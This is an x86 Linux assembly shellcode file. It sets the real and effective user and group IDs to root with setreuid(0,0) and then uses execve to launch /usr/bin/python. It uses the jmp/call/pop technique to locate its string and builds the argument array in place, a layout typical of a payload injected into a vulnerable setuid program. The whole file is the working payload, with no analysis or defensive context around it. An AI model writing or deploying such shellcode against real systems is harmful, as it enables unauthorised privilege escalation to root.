section .text
    global _start

_start:
    ; Set real u/gid to root
    xor eax, eax
    add al, 0x46
    xor ebx, ebx
    mov ecx, ebx
    int 0x80
    jmp .data

.code:
    pop ebx             ; Load the address to the string into ebx
    mov eax, ecx
    mov [ebx+15], al    ; Put 0 byte at the end of the string
    mov [ebx+16], ebx   ; Copy the address to the string to 4 bytes after the string
    mov [ebx+20], eax   ; Copy zeroes after the address to the string
    mov al, 11          ; execve syscall #
    lea ecx, [ebx+16]   ; args, the 2rd argument
    lea edx, [ebx+20]   ; env vars, the 3rd argument
    int 0x80

.data:
    call .code
    python: db "/usr/bin/python"